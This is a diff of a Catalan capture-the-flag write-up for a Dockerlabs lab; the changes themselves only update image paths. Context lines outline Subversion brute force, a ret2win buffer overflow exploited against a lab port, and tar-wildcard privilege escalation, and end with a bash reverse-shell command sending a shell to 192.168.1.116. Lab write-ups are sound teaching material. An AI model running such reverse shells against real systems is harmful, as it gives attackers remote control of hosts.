@@ -5,7 +5,7 @@ title: WriteUp Subversión - Dockerlabs
 slug: subversion-writeup-dockerlabs-ca
 featured: false
 draft: false
-ogImage: "assets/subversion/OpenGraph.png"
+ogImage: "../../../assets/images/subversion/OpenGraph.png"
 tags:
   - writeup
   - dockerlabs
@@ -18,7 +18,7 @@ lang: ca
 ---
 
 
-![Alt text](/assets/subversion/OpenGraph.png)
+![Alt text](../../../assets/images/subversion/OpenGraph.png)
 
 Aquest laboratori, disponible a la plataforma Dockerlabs, cobreix múltiples desafiaments de seguretat: des de la força bruta en Subversion i l'endevinació d'un número aleatori insegur, fins a l'explotació d'un buffer overflow i l'escalada de privilegis amb la tècnica de comodins de tar.
 
@@ -94,7 +94,7 @@ Finished
 
 A la ruta del port 80 podem veure en el navegador:
 
-![Alt text](/assets/subversion/image.png)
+![Alt text](../../../assets/images/subversion/image.png)
 
 La ruta `/upload` és un fitxer de text amb el següent contingut:
 
@@ -151,7 +151,7 @@ Bé, vam descobrir un repositori però és privat, intentem utilitzar l'usuari q
 
 Intentem iniciar sessió amb un usuari diferent `test` i amb `svnuser`.
 
-![Alt text](/assets/subversion/image-1.png)
+![Alt text](../../../assets/images/subversion/image-1.png)
 
 Podem observar que l'usuari `svnuser` sembla que pertany a aquest servei, tot i que pel nom ja ho imaginàvem.
 
@@ -489,7 +489,7 @@ if __name__ == '__main__':
 
 Aconseguim endevinar el número aleatori i entrar a la funció `magic_text()`, on trobem que hi ha un buffer overflow.  
 
-![alt text](/assets/subversion/aleatorio-ok.png)  
+![alt text](../../../assets/images/subversion/aleatorio-ok.png)  
 
 ### Buffer overflow  
 
@@ -550,7 +550,7 @@ Intentarem fer un `ret2win` cridant la funció "fantasma" `shell()`, per la qual
 $ gdb -q subversion
 ```
 
-![alt text](/assets/subversion/gdb-shell.png)
+![alt text](../../../assets/images/subversion/gdb-shell.png)
 
 Obtenim l'adreça del registre `rdi` just abans de cridar `system` i la anotem.  
 
@@ -627,7 +627,7 @@ if __name__ == '__main__':
 
 L'executem i obtenim una shell en el nostre propi sistema, funcionant com esperàvem.  
 
-![alt text](/assets/subversion/exploit-1.png)  
+![alt text](../../../assets/images/subversion/exploit-1.png)  
 
 Ara modifiquem les primeres línies de l'exploit per, en comptes d'executar el binari `subversion` descarregat, fer-ho contra el port `1789`.  
 
@@ -639,13 +639,13 @@ p = remote('172.17.0.2', '1789')
 
 Tornem a executar l'exploit i obtenim una shell amb l'usuari `luigi` en el servidor.  
 
-![alt text](/assets/subversion/exploit-2.png)  
+![alt text](../../../assets/images/subversion/exploit-2.png)  
 
 ## Escalada de Privilegis  
 
 Per treballar amb més comoditat en el servidor, ens creem una altra shell i fem el tractament de la tty.  
 
-![alt text](/assets/subversion/escalada.png)  
+![alt text](../../../assets/images/subversion/escalada.png)  
 
 ```
 /usr/bin/bash -c "/usr/bin/bash -i >& /dev/tcp/192.168.1.116/12345 0>&1"
